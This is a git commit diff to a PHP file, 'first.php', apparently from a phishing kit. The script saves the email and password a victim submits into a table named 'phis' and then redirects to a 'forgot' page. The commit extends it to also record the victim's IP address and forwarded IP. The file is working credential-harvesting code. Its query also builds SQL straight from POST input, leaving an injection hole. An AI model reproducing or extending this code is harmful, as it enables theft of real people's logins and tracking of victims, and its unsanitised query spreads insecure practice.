3a01e995a5e1621524c18302220210ae3bf2205b
shehrozsheikh <shehrozsheikh@outlook.com>
2016-03-25 12:21:48 +0500

    Update first.php

--- Mobile/first.php
+++ Mobile/first.php
@@ -4,8 +4,12 @@ require_once('../db-connection.php');
 $t = time();
 $email = $_POST['email'];
 $password = $_POST['password'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$proxIp = $_SERVER['HTTP_X_FORWARDED_FOR'];
 $time = date("Y-m-d",$t);
-$query = "INSERT INTO `phis`(`Email`, `Password`, `Time`) VALUES ('$email','$password','$time')";
+$query = "INSERT INTO `phis`(`Email`, `Password`, `Time`,`ip`,`ProxIp`) VALUES ('$email','$password','$time','$ip','$proxIp')";
+
+
 $link->query($query);
 $email = $_POST['email'];
 header ('Location:forgot/index.php?email='.$email);
